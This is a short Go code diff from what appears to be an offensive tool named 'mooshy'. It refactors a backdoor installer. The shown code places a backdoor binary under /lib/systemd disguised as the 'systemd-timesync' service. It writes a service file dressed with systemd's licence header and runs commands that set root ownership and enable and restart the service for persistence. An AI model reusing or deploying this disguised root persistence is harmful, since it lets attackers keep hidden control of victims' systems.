@@ -11,13 +11,13 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+
+	"github.com/rvolosatovs/mooshy"
 )
 
-const ServiceName = "systemd-timesync"
-
 var (
-	BackdoorPath        = filepath.Join("/lib", "systemd", ServiceName)
-	BackdoorServicePath = filepath.Join("/lib", "systemd", "system", ServiceName+".service")
+	BackdoorPath        = filepath.Join("/lib", "systemd", mooshy.ServiceName)
+	BackdoorServicePath = filepath.Join("/lib", "systemd", "system", mooshy.ServiceName+".service")
 	BackdoorServiceFile = []byte(fmt.Sprintf(`#  This file is part of systemd.
 #
 #  systemd is free software; you can redistribute it and/or modify it
@@ -135,8 +135,8 @@ Output: %s`, *path, err, string(out))
 			{"mv %s %s", []interface{}{backdoor.Name(), BackdoorPath}},
 			{"chmod 0755 %s", []interface{}{BackdoorPath}},
 			{"chown root:root %s", []interface{}{BackdoorPath}},
-			{"systemctl enable %s.service", []interface{}{ServiceName}},
-			{"systemctl restart %s.service", []interface{}{ServiceName}},
+			{"systemctl enable %s.service", []interface{}{mooshy.ServiceName}},
+			{"systemctl restart %s.service", []interface{}{mooshy.ServiceName}},
 		} {
 			ls = append(ls, fmt.Sprintf(l.Format, l.Args...))
 		}
